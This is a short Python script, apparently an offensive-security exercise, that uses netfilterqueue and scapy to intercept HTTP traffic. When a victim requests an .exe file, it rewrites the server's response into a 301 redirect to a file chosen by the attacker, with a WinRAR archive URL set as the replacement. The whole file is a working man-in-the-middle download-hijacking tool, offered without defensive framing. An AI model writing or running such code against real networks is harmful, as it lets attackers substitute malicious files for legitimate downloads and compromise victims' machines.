#!/usr/bin/env python3

import netfilterqueue
import scapy.all as scapy
import subprocess

class FakeDownload:


    def __init__(self, f):
        print("[+]Intercepting downloading file!")
        self.ack_list = []
        self.file = f

    def set_load(self,packet, load):
        packet[scapy.Raw].load = load

        del packet[scapy.IP].len
        del packet[scapy.IP].chksum
        del packet[scapy.TCP].chksum

        return packet

    def process_packet(self, packet):
        scapy_packet = scapy.IP(packet.get_payload())
        if scapy_packet.haslayer(scapy.Raw):
            if scapy_packet[scapy.TCP].dport == 80:
                if ".exe" in scapy_packet[scapy.Raw].load.decode():
                    print("[+] exe Request")
                    self.ack_list.append(scapy_packet[scapy.TCP].ack)

            elif scapy_packet[scapy.TCP].sport == 80:
                if scapy_packet[scapy.TCP].seq in self.ack_list:
                    self.ack_list.remove(scapy_packet[scapy.TCP].seq)
                    print("[+] Replacing file")
                    modified_packet = self.set_load(scapy_packet, "HTTP/1.1 301 Moved Permanently\nLocation: " + self.file + "\n\n")


                    packet.set_payload(bytes(modified_packet))

        packet.accept()


    def start(self):
        queue = netfilterqueue.NetfilterQueue()
        queue.bind(0, self.process_packet)
        queue.run()

tmp = FakeDownload("https://www.win-rar.com/fileadmin/winrar-versions/rarlinux-x64-5.9.1.tar.gz")
tmp.start()